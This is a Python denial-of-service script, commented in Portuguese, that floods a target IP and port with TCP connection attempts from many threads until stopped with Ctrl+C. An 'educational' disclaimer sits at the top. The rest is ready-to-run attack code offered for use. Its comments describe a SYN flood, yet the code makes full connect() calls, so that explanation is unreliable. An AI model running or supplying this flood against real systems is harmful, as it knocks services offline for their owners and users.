# Código para realizar um ataque DoS em um dado IP; para fins educacionais.
# O código foi escrito para fins educacionais. Não sou responsável por qualquer uso indevido.
# Use por sua conta e risco.

# O codigo cria um socket e envia pacotes SYN para o IP de destino. Utilizando
# Threads para enviar os pacotes, o que torna o ataque mais eficiente.

# Importando as bibliotecas necessárias
import socket
import random
import sys
import threading

# Definindo a classe para o ataque
class dos:
    # Definindo a função de inicialização
    def __init__(self):
        # Definindo as variáveis
        self.ip = ""
        self.port = 0
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.threads = 0
        self.running = True

    # Definindo a função criar infinitos clientes e conectar-los ao servidor
    # deixando o servidor aguardando a resposta SYN-ACK
    def connect(self):
        # Definindo as variáveis
        while self.running:
            # Criando o socket
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Conectando ao servidor
            try:
                self.socket.connect((self.ip, self.port))

            except socket.error:
                pass

    # Definindo a função para iniciar o ataque
    def attack(self, ip, port, threads):
        # Definindo as variáveis
        self.ip = ip
        self.port = port
        self.threads = threads
        # Criando as threads
        for i in range(threads):
            # Criando a thread
            thread = threading.Thread(target=self.connect)
            # Definindo a thread como daemon
            thread.daemon = True
            # Iniciando a thread
            thread.start()

    # Definindo a função para parar o ataque
    def stop(self):
        self.running = False


# Definindo a função para mostrar a mensagem de ajuda
def help():
    print("Usage: python dosattack.py <ip> <port> <threads>")
    print("Example: python dosattack.py")


# Definindo a função para iniciar o ataque
def start(ip, port, threads):
    # Definindo as variáveis
    ip = sys.argv[1]
    port = int(sys.argv[2])
    threads = int(sys.argv[3])
    # Criando o objeto
    attack = dos()
    # Iniciando o ataque
    attack.attack(ip, port, threads)
    # Mostrando a mensagem de sucesso
    print("Attack started on %s:%s with %s threads." % (ip, port, threads))
    # Esperando o usuário pressionar Ctrl+C
    try:
        while True:
            pass
    except KeyboardInterrupt:
        # Parando o ataque
        attack.stop()
        # Mostrando a mensagem de sucesso
        print("Attack stopped.")


# Verificando se o usuário forneceu os argumentos necessários
if len(sys.argv) < 4:
    # Mostrando a mensagem de erro
    print("Error: missing arguments.")
    # Mostrando a mensagem de ajuda
    help()
else:
    # Iniciando o ataque
    start(sys.argv[1], sys.argv[2], sys.argv[3])
